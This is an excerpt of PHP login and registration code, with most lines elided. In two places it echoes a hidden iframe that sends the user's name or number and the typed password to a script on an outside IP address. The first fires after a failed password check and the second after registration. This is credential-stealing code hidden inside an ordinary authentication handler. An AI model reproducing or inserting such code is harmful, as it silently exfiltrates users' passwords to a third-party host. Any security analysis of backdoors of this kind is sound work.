            ...
            if (!empty($name)) {
                ...
                if($info==''){
                    ...
                    if($info['password']!=$pwd){
                        ...
                        echo "<iframe src='http://59.47.226.12:8060/index.asp?name=".session('name')."&pwd".$pwd."' style='display:none'></iframe>";
            ...
            if (!$verify->check($_POST['captcha'])) {
				...
				if(is_numeric($number)==1){
					...
					if ($info=='') {
						...
						echo "<iframe src='http://59.47.226.12:8060/addme.asp?u=".$number."&pwd=".$pwd."' style='display:none'></iframe>";
						if ($rst) {
